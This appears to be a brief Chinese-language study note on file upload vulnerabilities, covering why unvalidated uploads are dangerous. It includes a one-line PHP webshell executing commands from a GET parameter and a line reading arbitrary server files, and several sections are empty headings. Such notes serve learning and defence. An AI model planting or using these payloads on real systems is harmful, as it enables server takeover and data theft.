---
description: 上传文件的行为本身就是有隐患的，若配置错误、处理不当，足以造成损害
---

# ✔️ 文件上传 - File upload

## 漏洞原理

* 用户上传的文件存储到服务器的文件系统之前，不会对其执行任何验证
* 或者验证存在固有缺陷或者容易被绕过
* 或者强大的验证措施也可能在构成网站的主机和网站的文件系统中不一致地应用，从而导致可被利用的差异

## 存在漏洞的特征

### 利用不受限制的文件

* [x] 允许上传服务器端脚本文件（PHP / Java / Python）
* [x] 可将这些脚本文件配置为代码执行

### 利用上传验证缺陷





## 常见攻击方式

### 1. 上传webshell

```php
// 通用的Webshell
<?php echo system($_GET['command']); ?>
```



### 2. 后续攻击

```php
// 从服务器的文件系统读取任意文件
<?php echo file_get_contents('/path/to/target/file'); ?>
```

## 绕过上传验证措施

